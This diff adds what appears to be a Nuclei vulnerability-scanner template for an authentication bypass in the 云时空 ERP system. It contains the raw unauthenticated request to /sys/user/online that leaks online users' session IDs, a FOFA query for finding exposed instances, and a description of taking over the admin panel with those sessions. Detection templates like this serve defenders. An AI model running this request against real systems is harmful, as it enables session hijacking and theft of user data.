@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"sessionid":'
+            - '"tomcat":'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /sys/user/online HTTP/1.1
+          Host: {{Hostname}}
+id: yunshikongERP-user_online-Authentication-bypass
+info:
+    author: Superhero
+    description: |-
+        fofa: title="云时空社会化商业ERP系统"
+        云时空社会化商业ERP系统 user/online 接口存在身份认证绕过漏洞，未授权的攻击者可利用漏洞url获取在线用户sessionid 导致用户信息泄露，并且切换网站session后可直接接管后台，造成信息泄露或恶意破坏，使系统处于极不安全状态。
+    name: 云时空社会化商业ERP系统 user/online 身份认证绕过漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486076&idx=1&sn=5c5616fb7c16e18fd5caff5a00e17c75&chksm=c267bf4ff5103659cefd9daae5651aee0b2e61d9c9b18993a3a6d054fdcb008a2af2c967fbf6&token=803667191&lang=zh_CN#rd
+    severity: high
+    tags:
+        - Authentication bypass
+        - tomcat
+        - Kong
+        - 云时空社会化商业ERP
